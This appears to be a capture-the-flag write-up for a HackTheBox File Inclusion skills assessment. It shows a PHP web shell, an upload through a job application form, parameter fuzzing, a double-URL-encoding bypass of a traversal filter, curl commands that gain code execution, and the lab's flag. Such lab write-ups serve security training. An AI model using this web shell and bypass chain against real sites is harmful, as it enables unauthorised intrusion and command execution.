# File Inclusion — Skills Assessment Write-Up (Sumace Consulting)

> **Module**: File Inclusion — HackTheBox
> **Goal**: Web application penetration test → gain RCE → read the flag in the root `/` directory
> **Final flag**: `eedbb78d4800aa45573840ed6bd2d1e3`

---

## Scenario

We have been contracted by **Sumace Consulting Gmbh** to carry out a penetration test against their company website. Last year's assessment resulted in zero findings, but this year they introduced a new **job application form** — a good place to start, since it may be a potential attack vector.

---

## 1. Reconnaissance

The site has three main pages. The **Home** page has no parameters in the frontend that look vulnerable, so we move to the **Apply** form.

We find a form where, to apply, you must enter first name, last name, email, a CV (resume), and additional notes.

<img width="1852" height="841" alt="applyform" src="https://github.com/user-attachments/assets/13526cb4-cf1c-48fb-b065-5d962249776f" />


We focus on the **resume upload**, since it's a potential candidate for an **LFI via file upload**.

---

## 2. Crafting and uploading the shell

We create a PHP web shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

We upload it through the form. The form responds that the request was successful.

<img width="1915" height="761" alt="thanskforapplying" src="https://github.com/user-attachments/assets/4fadf858-5d90-43bb-a311-d8279e44253f" />


Now we need to figure out **where the shell was saved** so we can reach it — and, above all, find a parameter vulnerable to file reading.

---

## 3. The MD5 clue

Looking at the page source, there isn't much to see — but we notice that **images are referenced by something that looks a lot like an MD5 hash**:

```html
<img src="/api/image.php?p=9e3836574d40d60a56435829003f0196">
```

Maybe our uploaded shell is saved with an MD5 name somewhere too...

<img width="1511" height="210" alt="deduction md5" src="https://github.com/user-attachments/assets/b533ddcf-237b-45db-af7c-79e706676a55" />


---

## 4. Fuzzing for a hidden parameter

Since we can't find anything that lets us read the shell, we start **fuzzing the various pages for hidden parameters**.

Fuzzing `contact.php` reveals a hidden parameter called **`region`**:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://154.57.164.82:30679/contact.php?FUZZ=value' -fs 1771
```

<img width="1647" height="526" alt="regionpar" src="https://github.com/user-attachments/assets/c431d7bd-30b4-42fb-8459-a9848360d68b" />


---

## 5. Testing the filter

We start testing `region` with `.` and `/`. The page responds that the parameter is invalid:

```
'region' parameter contains invalid character(s)
```

<img width="1915" height="758" alt="invalidregionpar" src="https://github.com/user-attachments/assets/5ad81ce5-335c-4588-992f-4f34d38d39c5" />


This is a great clue: it confirms the parameter is **reactive** but applies a **protection** against the characters `.` and `/`. We need to bypass it.

---

## 6. Bypassing the filter with double URL encoding

We try encoding `.` and `/` with **double encoding**:

| Character | Double encoding |
|-----------|-----------------|
| `.` | `%252e` |
| `/` | `%252f` |

With the following request the site returns **no error** — bypass confirmed!

```
http://154.57.164.82:31750/contact.php?region=%252e%252e%252f
```

<img width="1918" height="831" alt="successfullbypass" src="https://github.com/user-attachments/assets/3eb71e54-eb87-4a33-b944-3d9a3eac2f9f" />


The filter checks for *literal* `.` and `/`. With `%252e`/`%252f` the input contains no literal forbidden characters, so it passes the check. Then the server decodes it back to `.` and `/` **after** the check — too late to block us.

---

## 7. Locating the shell — the MD5 name

Now that we know how to read files, we still need to find **where our shell was saved**. Let's check if it was stored in `uploads/`, the classic directory.

Since we deduced the web app likely names uploads with an MD5 hash, we first need the MD5 value of our shell (which is the value that would be referenced on the server). We calculate it with a simple command:

```bash
md5sum shell.php
# fc023fcacb27a7ad72d605c4e300b389
```

<img width="746" height="242" alt="encodedshell" src="https://github.com/user-attachments/assets/8faa731c-bff0-4602-b620-4abcfb400ee5" />

---

## 8. Gaining RCE

We build the final command to reach the shell through `uploads/`. We store the MD5 in a variable for convenience (so we don't have to retype the encoded value):

```bash
MD5=$(md5sum shell.php | awk '{print $1}')
curl -s "http://154.57.164.82:31750/contact.php?region=%252e%252e%252fuploads%252f${MD5}&cmd=id"
```

**We're in!**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<img width="1673" height="707" alt="finallyinshell" src="https://github.com/user-attachments/assets/083ba299-6557-471d-8512-cedee0c9c3e0" />


**How the path resolves**: `contact.php` runs `include "./regions/" . $region . ".php"`. Our `region` becomes `../uploads/<md5>`, so the final include is `./regions/../uploads/<md5>.php` → `./uploads/<md5>.php` = our shell. Note we omit `.php` because `contact.php` appends it automatically.

---

## 9. Finding the flag

We list the root `/` directory. We use `%20` to fill the spaces, since the URL doesn't accept literal spaces:

```bash
MD5=$(md5sum shell.php | awk '{print $1}')
curl -s "http://154.57.164.82:31750/contact.php?region=%252e%252e%252fuploads%252f${MD5}&cmd=dir%20/"
```

We spot the flag file: `flag_09ebca.txt`

<img width="1463" height="468" alt="flag" src="https://github.com/user-attachments/assets/f9605b05-b5d5-425b-964a-1e736e8eb220" />


---

## 10. Reading the flag

We read the flag file:

```bash
MD5=$(md5sum shell.php | awk '{print $1}')
curl -s "http://154.57.164.82:31750/contact.php?region=%252e%252e%252fuploads%252f${MD5}&cmd=cat%20/flag_09ebca.txt"
```

Game over!

```
eedbb78d4800aa45573840ed6bd2d1e3
```

---



*Write-up — HackTheBox File Inclusion — Skills Assessment (Sumace Consulting)*
